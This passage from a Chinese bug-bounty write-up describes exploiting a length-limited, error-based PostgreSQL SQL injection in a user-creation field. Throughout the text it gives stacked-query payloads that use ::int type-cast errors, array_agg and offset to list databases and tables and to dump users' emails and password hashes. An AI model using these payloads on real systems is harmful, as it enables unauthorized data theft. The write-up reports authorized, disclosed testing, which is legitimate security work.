bypasses），但是所有其他页面都没有返回未经过滤的值或原始值，因为它们中的大多数都包裹在引号中，而引号已正确转义，因此级联绕过也不可用。
从公开查询中，我找到了具有所有注册用户的表userdata所对应的列，下文会对此进行说明。
时间紧迫，之后开始枚举表名。使用payload为`test1111;SELECT/**/version/**/from/**/existornot;`，我能够确定一个表是否存在。如果表不存在，则应用程序返回错误消息`psycopg2.errors.UndefinedTable)
column \"existornot\" does not
exist`；如果表存在，则应用程序返回`psycopg2.errors.UndefinedColumn) column \"version\" does
not exist`表明对应的列不存在。
在尝试了每个查询并绕过之后发现，即使使用了SELECT语句，我也无法检索信息，并且一切都以语法错误或用户创建的错误结束。原因可能是从`CREATE
SCHEMA`上下文转义后，第三个查询失败。
我将此漏洞报告为有限的blind
SQL注入，可以枚举表和列，并请求允许进一步利用。在访问某些内容之前，最好先征得许可，因为如果未经许可，这样做可能会造成麻烦。
幸运的是，我的报告赢得了质量准则，并获得了进一步利用的许可。在测试期间，我发现了一些很有趣的东西，那就是该应用程序如何在可用列和表上泄露一些蛛丝马迹。我使用查询语句为`teb2;SELECT/**/password/**/from/**/pg_user;`，应用程序响应为：
    {
        "multi": true, 
        "response": {
            "createUserSuccess": {
                "children": {
                    "type": "Div", 
                    "props": {
                        "className": "text-danger", 
                        "children": [
                            "New User not created: (psycopg2.errors.UndefinedColumn) column \"password\" does not exist\nLINE 1: CREATE SCHEMA t12;SELECT/**/password/**/from/**/pg_user;\n                                    ^\nHINT:  Perhaps you meant to reference the column \"pg_user.passwd\".\n\n[SQL: CREATE SCHEMA t12;SELECT/**/password/**/from/**/pg_user;]\n(Background on this error at: http://sqlalche.me/e/f405)"
                        ]
                    }, 
                    "namespace": "dash_html_components"
                }
            }
        }
    }
该应用程序提供了一条提示：`Perhaps you meant to reference the column
\"pg_user.passwd\"（也许您打算引用列
\"pg_user.passwd\"）`，该列公开了与`password`相似的可用列`passwd`。在枚举时在后面加个`+`，还可以枚举出相似的列或表。
## 使用类型转换来获取信息
在过去的几年中，我研究了与类型转换有关的内容，其中用户输入被转换为不可能的类型，从而造成了信息泄露。由于目前无法获取任何数据，我研究了与类型转换有关的内容，发现PostgreSQL有一个名为CAST()的函数可用于转换数据类型。为了引起异常以便造成信息泄露，我想将列数据转换为INTEGER。
为了查询当前的数据库版本，我尝试了如下查询语句：`test11a1111;SELECT/**/CAST(version()/**/AS/**/INTEGER);`，结果出来了，大家快康：
收到响应为：`PostgreSQL 12.3 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.8.3
20140911 (Red Hat 4.8.3-9),
64-bit`，由数据类型转换失败而引起。直到此刻才取得较大的进展（不知道接下来还要面对什么挑战，哈哈）。
使用CAST()函数也遇到麻烦，之前是限制了80个字符的输入，而使用 CAST()进行查询时，最多只能查询了45个字符：
    >>> 
    >>> len("t;SELECT/**/CAST(version()/**/AS/**/INTEGER);")
    45
    >>>
在Google上搜索CAST()的替代用法后，我发现仅通过使用`::int`即可转换数据类型，而`::int`比CAST()查询短得多。查询
`t;SELECT\nversion()::int`返回相同的响应，但字符长度短很多。
    >>> len("t;SELECT\nversion()::int")
    23
    >>>
使用`\n`代替`/**/`并使用`::int`代替`CAST()`，节省了大量字符长度，有助于进一步渗透。
目前能够从version()，current_user等命令中获取单个值，现在是时候检索表信息了。
## 获取表信息
接下来，我想检索所有可用的表名，然后尝试访问`pg_catalog.pg_tables`(该表包含所有可用表名)。查询语句为：`tc;SELECT\n(select\ntablename\nfrom\npg_catalog.pg_tables\nlimit\n2)::integer`，响应如下：
收到一个错误 ：`New User not created: (psycopg2.errors.CardinalityViolation) more
than one row returned by a subquery used as an expression\n\n[SQL: CREATE
SCHEMA`，表明不允许多行。如果查询返回的是数据库列表，则由于对基数的某些违反，应用程序不会显示它们。
随后尝试使用`limit`和`offset`，这样我就可以检索特定的行并将输入限制为单行，可以正常工作！我能够检索名为`userconfig`的表：
使用查询语句`tc;SELECT\n(select\ntablename\nfrom\npg_catalog.pg_tables\nlimit\n1\noffset\n3)::integer`返回上面的输出。这是一个受限的情况，其中最大表长度是13，我想列出所有可用表：
    >>> len("tc;SELECT\n(select\ntablename\nfrom\npg_catalog.pg_tables\nlimit\n1\noffset\n3)::integer")
    80
    >>> len("tc;SELECT\n(select\ntablename\nfrom\npg_catalog.pg_tables\nlimit\n1\noffset\n3)::int")
    76
## 字符限制？行数限制？
我搜寻了可用于将多行转换为单行的技术和方法，就跟`group_concat`函数，却又不占用太多的字符长度。经过研究，我想出了`array_to_string`函数和`array_agg`函数。使用`array_agg`函数来转换所有返回的行，它会返回一个数组；使用`array_to_string`函数将返回的数组转换为字符串。综上，查询语句为`b2;select\narray_to_string(array_agg(datname),',')::int\nfrom\npg_database;`，我能够获得可用数据库名称的列表：
为了检索表列表，使用查询语句为`b2;select\narray_to_string(array_agg(tablename),',')::int\nfrom\npg_tables;`(长度为72)：
我们已经知道通过查询公开发现的列名和表名userdata，如果访问它以证明可以访问用户数据可还行？
## 获取其他用户数据
长度限制仍然是一个问题，但是我仍然能够检索所有可用的数据库，表和列。通过使用查询语句为`t3;SELECT\n(select\nemail\nfrom\nuserdata\nlimit\n1\noffset\n5)::int`，应用程序返回了偏移量为5的用户电子邮件地址，所以我使用了offset转储了具有数百个用户的整个表：
使用`t3;SELECT\n(select\npassword\nfrom\nuserdata\nlimit\n1\noffset\n5)::int`返回了SHA256的用户密码哈希值：
## 后记
就是这样了！已经能够访问所有信息，并且利用此漏洞，我能够删除，创建和修改任何表。对于所有在那里花时间学习新知识或怀疑自己的技能而又没有发现任何漏洞的人们，只要记住：世上无难事，只怕有心人！
>
> 在撰写报告时，我虽然只限于表和列的枚举，但是花了11个小时的渗透测试后，我才能达到这种地步。但是由于缺少授权，我无法获得系统访问权限，但是已经得到了我想要的东西。
最后得到了3000刀赏金。
The end